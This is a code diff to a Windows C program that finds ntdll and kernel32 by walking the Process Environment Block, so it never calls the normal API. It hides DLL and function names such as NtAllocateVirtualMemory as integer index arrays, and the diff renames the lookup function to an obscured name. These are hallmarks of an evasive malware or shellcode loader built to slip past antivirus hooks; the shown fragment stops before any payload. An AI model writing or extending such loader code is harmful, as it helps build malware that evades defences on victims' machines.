@@ -3,6 +3,12 @@
 #include "syscalls.h"
 #include <tlhelp32.h>
 
+#include <wchar.h>
+
+void CharToWChar(const char *charStr, wchar_t *wcharStr, size_t size) {
+    mbstowcs(wcharStr, charStr, size);
+}
+
 typedef struct _LDR_DATA_TABLE_ENTRY {
     LIST_ENTRY InLoadOrderLinks;
     LIST_ENTRY InMemoryOrderLinks;
@@ -91,7 +97,7 @@ typedef struct _TEB {
     PPEB ProcessEnvironmentBlock;
 } TEB, *PTEB;
 
-HMODULE GetModuleHandlePEB(const wchar_t *dllName) {
+HMODULE getmanmodulehandleppe(const wchar_t *dllName) {
 #ifdef _M_X64
     PPEB peb = (PPEB)__readgsqword(0x60);
 #else
@@ -118,6 +124,7 @@ HMODULE GetModuleHandlePEB(const wchar_t *dllName) {
 
         // Compare DLL name (case-insensitive)
         if (_wcsicmp(module->BaseDllName.Buffer, dllName) == 0) {
+            wprintf(L"Found module: %s at address: %p\n", module->BaseDllName.Buffer, module->DllBase);
             return (HMODULE)module->DllBase;  // Return handle to the module
         }
     }
@@ -140,7 +147,7 @@ int main(int argc, char* argv[]) {
     wchar_t ntdll_wide[256];  
     CharToWChar(ntdll_ascii, ntdll_wide, sizeof(ntdll_wide) / sizeof(wchar_t));
 
-    HMODULE hNtdll = GetModuleHandlePEB(ntdll_wide);
+    HMODULE hNtdll = getmanmodulehandleppe(ntdll_wide);
     
     // Convert kernel32.dll from ASCII to wide string
     int ws_lld_ker_32[] = {10, 4, 17, 13, 4, 11, 55, 54, 62, 3, 11, 11};
@@ -149,7 +156,7 @@ int main(int argc, char* argv[]) {
     wchar_t kernel32_wide[256];
     CharToWChar(kernel32_ascii, kernel32_wide, sizeof(kernel32_wide) / sizeof(wchar_t));
 
-    HMODULE istfromKe__ws_ls_32 = GetModuleHandlePEB(kernel32_wide);
+    HMODULE istfromKe__ws_ls_32 = getmanmodulehandleppe(kernel32_wide);
     
     int ntalloc_mem[] = { 39, 19, 26, 11, 11, 14, 2, 0, 19, 4, 47, 8, 17, 19, 20, 0, 11, 38, 4, 12, 14, 17, 24 };
     // Get the address of the NtAllocateVirtualMemory function
